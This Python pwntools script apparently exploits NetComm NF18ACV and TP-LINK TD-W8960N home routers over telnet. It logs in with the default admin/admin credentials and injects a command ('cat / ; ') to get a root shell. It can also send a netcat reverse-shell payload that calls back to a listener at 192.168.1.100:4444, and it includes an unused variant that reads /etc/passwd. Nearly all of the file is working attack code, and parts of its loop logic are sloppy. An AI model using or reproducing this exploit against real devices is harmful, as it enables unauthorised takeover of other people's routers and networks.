from __future__ import print_function
from pwn import *
import sys
from time import sleep

FLAG_MODEL_CHK = True # Disable if necessary


 # for self-chk purposes only 
CONFIRMED_MODELS = {
	"NetComm NF18ACV": b'NF18ACV',
	"TP-LINK TD-W8960N": b'TD-W8960N 5.0 DSL Modem Router',
}

TARGET_IP = "192.168.1.1"
TARGET_PORT = 23 #telnet

REVERSESHELL_IP = "192.168.1.100"
REVERSESHELL_PORT = 4444

# always-standard login pass :joy:
USERNAME = "admin"
PASSWORD = "admin"

# consts for script itself. Do not modify.
OPTIONS = {
	1:	"Direct shell (UNSTABLE)",
	2:	"Reverse shell on {}:{}".format(REVERSESHELL_IP, REVERSESHELL_PORT)
}

PROMPT_TELNET = b'> '

SHELL_SIGNATURE = b'shell'

SHELL = "/bin/sh"
INJECTION =  "cat / ; "
# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-busybox
REVERSESHELL = "rm /tmp/f;mknod /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f".format(REVERSESHELL_IP, REVERSESHELL_PORT) 

## or ";" instead of "&&". Also works. But not "||"
DIRECT_QUICK = INJECTION+SHELL 
DIRECT_SHOWOFF = "cat /etc/passwd && "+SHELL # unused.

REVERSE_QUICK = INJECTION+REVERSESHELL

def main():
	option = 0
	print("Telnet access acquired. Choose from the options")
	while(option == 0):
		for k, v in OPTIONS.items():
			print("{} : {}".format(k,v))
		print("Make your selection: ", end="")
		buf = int(sys.stdin.readline().strip())
		for k, v in OPTIONS.items():
			if(k == buf): #valid option
				option = buf

	io = remote(TARGET_IP, TARGET_PORT) 

	# model header is always broadcasted on the vulnerable routers
	print("1. model")
	buf = io.recvline()
	print(buf)
	if(FLAG_MODEL_CHK):
		print("Model checking is enabled, the script will no confirmed model found")
		
		for k,v in CONFIRMED_MODELS.items():
			if(buf.find(v) != -1):
				model = k
				break
		assert(len(model)) # self-chk
		print("Model detected: "+model)

	print("2: login")
	io.recvuntil(b'Login: ')
	io.sendline(USERNAME)
	sleep(0.5)

	print("3: pass")
	io.recvuntil(b'Password: ')
	io.sendline(PASSWORD)
	sleep(0.5)

	try:
		buf = io.recv()
		if(buf.find(b'incorrect') != -1):
			print("Somehow credentials are incorrect?")
			assert(False)
		elif(buf.find(PROMPT_TELNET) != -1):
			print("All good, logged in..")
		else:
			print("Not sure what happened. Check below")
			print(buf)
			assert(False)
			
		print("Telnet access acquired!")
		
		if(option == 1):
			io.sendline(DIRECT_QUICK)
			sleep(0.5)
			buf = io.recv()
			
			if(buf.find(SHELL_SIGNATURE) == -1):
				print("No shell detected. Possibly old firmware")
				print(buf)
				
				
			if(1):
				print("========================")
				print("Shell obtained successfully!")
				print("Now, shell is kind of unstable, and may randomly")
				print("glitch out into telnet script; hence:")
				print("1xCTRL+C to respring/retether the hack")
				print("2xCTRL+C / 1xCTRL+Z to exit")
				print("========================")
				print(buf)
				while(1):
					io.interactive(prompt = "")
					shell_screwed = 1
					while(shell_screwed):
						print("trying for shell...")
						io.sendline(DIRECT_QUICK)
						sleep(0.25)
						buf = io.recv()
						shell_screwed = (buf.find(SHELL_SIGNATURE) == -1)
						sleep(0.25)
		elif (option == 2):
			print("========================")
			print("Reverse shell route")
			print("1xCTRL+C to respring/retether reverse shell")
			print("2xCTRL+C / 1xCTRL+Z to exit")
			print("========================")

			while(1):
				while(1):
					print("Sending reverse shell str...")
					io.sendline(REVERSE_QUICK)
				
				
	
	except Exception as e:
		raise e

if __name__ == '__main__':
	main()